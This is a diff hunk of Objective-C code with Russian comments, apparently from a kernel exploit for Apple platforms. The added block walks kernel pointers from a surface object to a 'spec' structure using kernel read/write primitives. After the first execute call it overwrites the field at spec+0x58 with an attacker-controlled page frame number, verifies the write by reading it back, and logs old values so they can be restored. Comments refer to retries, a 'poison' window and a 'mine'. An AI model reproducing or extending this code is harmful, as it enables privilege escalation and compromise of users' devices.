@@ -7120,6 +7120,32 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
                   cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
     }
+    // 1.9.224: spec+0x58 ПОСЛЕ execute#1 — пре-execute дамп (1.9.223) показал
+    // канарейки и random (+0x00=0): спек ЗАПОЛНЯЕТСЯ фабрикой при первом execute,
+    // а не при create/submit. Патчить надо ТУТ (pfn уже на месте) — retry возьмёт
+    // ctlPFN: rewriter перечитывает spec+0x58 КАЖДЫЙ execute (р.55).
+    {
+        uint64_t pdS2 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t specS2 = (kpLooksLikeKernelPointer(pdS2) && kpSafeToRead(pdS2)) ? kp_untag_ptr(early_kread64(pdS2 + 0x60)) : 0;
+        if (kpLooksLikeKernelPointer(specS2) && kpSafeToRead(specS2)) {
+            uint64_t v2 = early_kread64(specS2 + 0x58);
+            kpNote(r, [NSString stringWithFormat:@"  [SPC-post] spec+0x58=%#018llx (ждём pfn32=%#x)", (unsigned long long)v2, pfn32]);
+            if ((uint32_t)v2 == pfn32) {
+                if (!nSpec) {
+                    uint64_t nq = (v2 & 0xffffffff00000000ULL) | ctlPFN;
+                    kpNote(r, [NSString stringWithFormat:@"  [SPC-post] ★ spec заполнен — патч: %#018llx → %#018llx", (unsigned long long)v2, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(specS2 + 0x58, nq);
+                    uint64_t rb = early_kread64(specS2 + 0x58);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    specVA[nSpec] = specS2 + 0x58; specOld[nSpec] = v2; nSpec++;
+                }
+            } else {
+                for (uint32_t o = 0; o + 8 <= 0x64; o += 8)
+                    kpNote(r, [NSString stringWithFormat:@"    spec-post+%#x: %#018llx", o, (unsigned long long)early_kread64(specS2 + o)]);
+            }
+        }
+    }
     // 1.9.219: retry ×3 (было 8 — меньше окно яда и нагрузка на мину); форма4 из
     // массива уже нет; DEP-хиты восстанавливаем после КАЖДОЙ попытки (яд живёт
     // только в окне execute, не секундами — урок prev-12).
